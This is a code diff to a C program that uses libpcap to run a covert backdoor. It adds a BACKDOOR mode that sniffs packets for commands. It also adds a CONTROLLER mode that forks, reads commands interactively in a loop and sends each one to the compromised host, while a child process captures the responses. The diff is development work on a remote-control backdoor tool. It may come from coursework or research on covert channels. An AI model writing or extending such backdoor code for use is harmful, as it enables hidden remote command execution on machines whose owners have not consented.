@@ -66,6 +66,8 @@ int start(int argc, char **argv, Mode mode)
         }
     }
 
+    int pid;
+
     pcap_if_t *alldevs, *temp;
     pcap_t *session;
     char filter_string[] = "ip";
@@ -130,15 +132,39 @@ int start(int argc, char **argv, Mode mode)
         return -1;
     }
 
+    if (mode == BACKDOOR)
+    {
+        // Start capturing packets
+        pcap_loop(session, 0, got_packet, (u_char *)&args);
+    }
+
     if (mode == CONTROLLER)
     {
-        issue_command(args.address, argv[2], argv[3]);
+        pid = fork();
+
+        if (pid) // parent
+        {
+            char command[MAX_COMMAND_LEN];
+            // issue_command(args.address, argv[2], argv[3]);
+            while (1)
+            {
+                printf("Enter command:\n");
+                fgets(command, MAX_COMMAND_LEN, stdin);
+                issue_command(args.address, argv[2], command);
+            }
+        }
+        else // child
+        {
+            pcap_loop(session, 0, got_packet, (u_char *)&args);
+            pcap_freealldevs(alldevs);
+        }
     }
+
     // Start capturing packets
-    pcap_loop(session, 0, got_packet, (u_char *)&args);
+    // pcap_loop(session, 0, got_packet, (u_char *)&args);
 
     // Clean up handles
-    pcap_freealldevs(alldevs);
+    // pcap_freealldevs(alldevs);
     return 0;
 }
 
